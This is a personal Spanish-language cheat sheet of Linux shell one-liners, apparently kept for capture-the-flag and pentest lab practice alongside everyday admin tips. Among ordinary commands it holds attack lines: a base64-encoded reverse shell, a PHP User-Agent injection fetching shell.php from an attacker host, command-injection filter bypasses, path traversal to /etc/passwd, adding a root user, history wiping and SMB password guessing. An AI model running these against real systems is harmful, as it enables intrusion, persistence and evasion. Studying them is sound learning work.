# netcat file transfer
a> nc -lnvp 444 < chisel
v> cat > chisel < nc /dev/tcp/ip_atacante/444

v> nc -l 4444 > file
a> nc 10.10.1.23 4444 < file

v> cat file | nc 10.6.4.61 9001
a> nc -lnvp 9001 > file

# nc port-scanner
nc -zv 172.17.0.1 1-1000

# abre un puerto y queda a la espera de conexiones
rlwrap nc -lnvp PUERTO 

# ftp
ftp -p 10.10.69.8 21 # modo pasivo

# cp
cp FILE.iso REN-FILE.iso && watch -n 2 du -sh $!

# cat
cat file | tr '[A-Z]' '[a-z]' # convierte Mayusculas por Minusculas
cat file | grep ::: | awk -F: '{print $1":"$4}'
cat file | xclip -sel clip # copia el contenido del archivo en el portapapeles
cat nmap.grep | grep -oP '\d{1,5}/tcp.*'
cat /etc/passwd | awk 'NR==17'
pwdx --> chequear path de un PID

# xclip
xclip -out -sel clip > file
xclip -sel clip

# find
find / -perm -4000 -type f 2>/dev/null
find . -type d -exec touch {}/FILE \;
find . -type f -printf "%T+ %p\n" | sort # ordena archivos y muestra una columna con timestamps
find / -type f -regexp ".*\(png\|jpg\)$" 2>/dev/null # multiples extensiones
find / -writable 2>/dev/null # archivos de escritura
find / /etc /var -type f 2>/dev/null # multiples locaciones
find / -user root -readable -type f 2>/dev/null # root + lectura
find / -type f -name 'user.txt' -exec cat {} \; 2>/dev/null
find /usr/bin/python3 -exec {} -c 'rev-shell' # bypassing
find thm/ -type f -iname 'notas'| xargs -i scp -o 'ProxyJump pgraffigna@192.168.122.1' '{}' quentin@192.168.0.20:
find . -type f -iname 'notas' -exec cat {} \; > total_notes.txt
find . ! -name 'notas.txt' -type f -exec rm -f {} +
find . -empty -type d -delete
find / -newermt "2022-10-15" ! -newermt "2022-10-16" -ls 2>/dev/null | less -S #&! para filtrar output no deseado

# mount
mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
sudo mount -t cifs //10.16.22.245/SCANNERDOC /mnt/ -o user=USER,vers=2.0

# manipulacion de texto
pdftotext -layout origen.pdf origen.txt
pdftotext -eol unix origen.pdf origen.txt
tr '\n' ',' < tplinkList.txt
paste -sd "," FILE  # agrega una coma entre palabras

# generador de passwords
head /dev/urandom | tr -dc A-Za-z0-9 | head -c 10 ; echo ' ' 
{ shuf -rn 8 -e {A..Z} {a..z}; shuf -rn 2 -e {0..9}; }| shuf | tr -d $'\n'; echo
pwgen -1 -c 9 -n 4 -s | while IFS= read -r i; do printf '%s\n' "$i"1; done

# sed
sed -i '/192\.168\.0\.1/d' /var/log/messages.log # elimina todas las lineas que contienen la ip
sed 's/ //g' hash.txt # elimina todas las lineas en blanco
sed '/^[[:space:]]*$/d' # elimina los espacios 
sed 's/\\n/\n/g' # reemplazar \n a salto de linea

# curl
curl 'http://10.10.154.13/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=test@customer.acmeitsupport.thm' # reset password hijacking
curl -A “<?php file_put_contents(‘shell.php’,file_get_contents(‘http://{ATTACKER_IP}/shell.php'))?>" -s http://{MACHINE_IP}%

curl -s -X POST URL --data-urlencode email=admin@admin.com'-- -  | grep '<h2>'
curl -s -X POST -d @FILE URL
curl -s -X POST 'http://46.101.81.30:32637/search.php' -b 'PHPSESSID=osr15ga0dbe56dgqj0aq0dgd57' -H 'Content-Type: application/json' -d '{"search": "flag"}'

curl -s http://<SERVER_IP>:<PORT>/api.php/city/ | jq # para listar el contenido
curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -d '{"city_name":"HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json' # para agregar un nuevo dato 

curl http://10.10.62.107:3000/public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd --path-as-is
curl -s -X GET http://admin:admin@10.10.189.8:3000/api/admin/settings | jq

## bypassing
curl -s -X POST http://10.10.57.159/secret/ -d command="echo 'bHMgLWxhCg==' | base64 -d | ba's'h" | awk '/<h2/,/<\/h2>/'
curl -s -X POST http://10.10.151.118/secret/ -d command="c\at /etc/passwd"

# awk
awk '{print "https://"$1}'
awk '{print $1 ":" $2}'
awk '{print $1}' FS=':' # FS=delimitador

# echo
echo "root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash" >> /etc/passwd # crear un usuario 'root2' con el PASSWORD creado
echo !:2-3 # rango de argumentos
echo !? # estado de salida del último comando
echo !$ # ultimo argumento
echo !^ # primer argumento 
echo !* # todos los argumentos
echo "testing%3Fcmd%3Dwhoami" | php -R 'echo urldecode($argn);'
echo /dev/null > ~/.zsh_history #borrar el historial zsh
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xNC4xNS4yMDcvODAwMCAwPiYxCg | bash | base64 -d | bash #base64 rev-shell encoding
echo " [√]"

# grep
grep -oP '\[.*?\]' # quita los corchetes
grep -a '[0-9][0-9]:[0-9][0-9]:[0-9][0-9]' /var/log/apache2/access.log # formato: HH:MM:SS
grep -oP '".*?"' bytearray.txt # filtra todo lo que esta entre comillas
grep '^mo' /usr/share/seclists/Discovery/Web-Content/common.txt | grep -x '.\{7,7\}' # busca palabras de 7 letras
grep '60E327' -i /usr/share/nmap/nmap-mac-prefixes
pdfgrep 'string' archivo.pdf | awk 'NF {print $NF}' | xclip -sel clip

# One-liners
for seq in $(seq 5); do curl -s -i http://10.10.74.120/post?id=$seq | grep 'Post not found' &>/dev/null && echo "post $seq no existe" || echo post>for i in admin dev test backup; do gobuster -u "url"/$i -w WORDLIST -t -o outputFile$i.txt; done # bucle para enum directorios
for i in {1..20}; do curl http://ip/users/$i 2>&1 | grep "s page</h1>" | cut -f2 -d '>' | cut -f1 -d \' ;done # enum de usuarios
for i in {1..10}; do timeout 1 bash -c "ping 192.168.0.$i"; done | grep '64' | awk '{print $4}' | tr -d ':' # ping sweep
for x in port port port; do nmap -Pn --max-retries 0 -p $x ip; done # port knocker
for num in {1..10}; do sudo arping -c 1 192.168.0.$num | grep '60' | awk '{print $4 "\t" $5}' | sed 's/(/ /;s/)/ /;s/.$//'; done # mac sweep

[ -d "${DIR}" ] || mkdir -p "${DIR}" # crear una carpeta sino existe

while read password; do echo 'penny:' $password && smbclient -L \\10.10.199.125 -U penny%\$password; done < rock-7L.txt

seq 1 1000 | xargs -P 50 -I {} echo {} 

# manipulación de archivos/carpetas
touch {/folder1/,./}file.{exe,dll,txt} # crea multiples archivos
curl -# --upload-file -F file=@FILE URL
dd if=FILE bs=1 skip=8 of=FILE.out # saca los primeros 8 bytes y deja el resto
dd if=FILE bs=1 count=8 of=FILE.out # solo deja los primeros 8 bytes
smbget -R smb://ip/carpeta -U USER

# arp discovery
arping -c 1 -I enp5s0 ip/mask
arp-scan -I enp5s0 IP -l
masscan --arp ip/mask > file
sudo nmap -RP ip

# cups
ssh admin@10.36.8.43 -T -L 3631:localhost:631 # portforwarding
cupsctl --remote-admin --remote-any --share-printers # activa la administración remota	
/usr/sbin/lpadmin -p imp_sistemas_testing -E -v socket://alv2-sist-print:9100 -P OKI_MPS5502mb.ppd

# google-dorking
intitle: index.of #open directory listing

# qemu
sudo apt install -y spice-vdagent && spice-vdagent # spice qemu copy-paste (aplicar en la VM)
remote-viewer spice://localhost:5900 -f & disown
virt-viewer --connect qemu:///system --wait kali64-OS &>/dev/null & disown # levanta el proceso + oculta el output + disocia el proceso de la terminal

# varios
apt list --installed > instalados.txt
diff old.txt new.txt | grep ">"|cut -c 3- > diff.txt

dpkg -i DEB &>/dev/null # esconde output + error 
dpkg-deb -xv file.deb file.out # descomprime el deb

wget --recursive http://ip -q
wget -r --no-parent http://10.10.150.153:9000/.mozilla/  # descarga recursiva
wget  -q --show-progress --progress=bar:force 2>&1 # muestra solo la barra de progreso

apt-get install git htop -qq > /dev/null # muestra solo los errores

ping -c ip -R # muestra ruta del ping hasta el destino

kill -9 $(jobs -p) # elimina los trabajos
kill % # borra todos los trabajos

xfreerdp /u:USUARIO /p:PASSWORD /size:1366x768 /f /v:10.16.22.103 # conexion remota via RDP por consola
xfreerdp /u:admin /p:password /cert:ignore /v:MACHINE_IP
xfreerdp /v:10.10.239.237 /u:USERNAME /p:PASSWORD /cert:ignore +clipboard /dynamic-resolution /drive:/tmp,share
rdp_check.py USUARIO:PASSWORD@10.21.17.107

read -n 5 -s -p "No podes poner mas de 5 caracteres" # n=caracteres, s=silent(oculta el texto), p=prompt
read -t 10 # 10 segundos para ingresar texto

setxkbmap -layout es # cambiar distribución de teclado
dpkg-reconfigure locales # cambiar idioma del sistema

jq '.listTemplateResponse[] | {name} | join(" ")' # extrae los nombres de VMs

# caracteres especiales que necesitan ser escapados con \
# ! " # $ & ' ( ) * , : ; < = > ? @ [ \ ] ^ ` { | }

# agregar multiples lineas a archivo
cat <<EOF >> /tmp/file.txt
linea 1
linea 2
EOF

# agregar multiples lineas a archivo con SUDO
sudo tee -a /tmp/file.txt > /dev/null <<EOT
linea 1
linea 2
EOT

# multiline comment
:<<'END_COMMENT'
comment1
comment2 
comment3
END_COMMENT

# git
# git token
export GITHUB_TOKEN=TOKEN
git clone https://USUARIO:GITHUB_TOKEN@github.com/pgraffigna/vagrantfile_templates.git

# git initial config
git config --global user.name "John Doe"
git config --global user.email johndoe@example.com
git remote set-url origin git@github.com:username/repo.git # configurar el repo para ssh

# git enumeration
git log -p # dentro de la carpeta .git
git reset --hard # para recomponer un git repo

# git repo cli
echo "# Dashboard-homer" >> README.md
git init
git add README.md
git commit -m "first commit"
git branch -M main
git remote add origin https://github.com/PUTINVLADIMI/Dashboard-homer.git
git push -u origin main

# fix snd-hda-intel en ubuntu 20.04
sudo tee /etc/modprobe.d/snd-hda-intel-fix.conf <<< 'options snd-hda-intel probe_mask=1'

# login modo texto
editar /etc/default/grub:
comentar linea 'quietsplash'
agregar 'text' a linea grub_cmdline
agregar 'console' a linea grub_terminal
sudo update-grub && sudo systemctl set-default multi_user.target

# background login lubuntu 18.04
/etc/lightdm/lightdm-gtk-greeter.conf 
background=/usr/share/lubuntu/wallpapers/fondo.jpg
user-background=false

# python env 
sudo apt update && sudo apt install python3-venv
python3 -m venv poc-venv
source poc-venv/bin/activate
deactivate

# dislocker (para montar sistema de archivos bitlocker)
mkdir -p /media/{bitlocker,bitlockermount}
dislocker /dev/sda3 -usistemas -p /media/bitlocker # desencripta la partición  
sudo mount -t ntfs-3g -o loop /media/bitlocker/dislocker-file /media/bitlockermount # monta la partición

# lxmed
chmod +x install.sh
sudo ./install.sh
apt install -y openjdk-17-jre-headless openjdk-17-jdk
java -jar /opt/lxmed/LXMenuEditor.jar

# DNS tools debugging
https://jvns.ca/blog/2021/11/04/how-do-you-tell-if-a-problem-is-caused-by-dns/

dig wizardzines.com
dig @1.1.1.1 domain.com
dig SOA wizardzines.com

# virtualbox fix multipass
systemctl stop snap.multipass.multipassd.service

# disco 1TB automount
UUID=26C00F163A80CC80 /home/USUARIO/datos ntfs auto,uid=1000,gid=1000,dmask=027,fmask=137      0  	  0

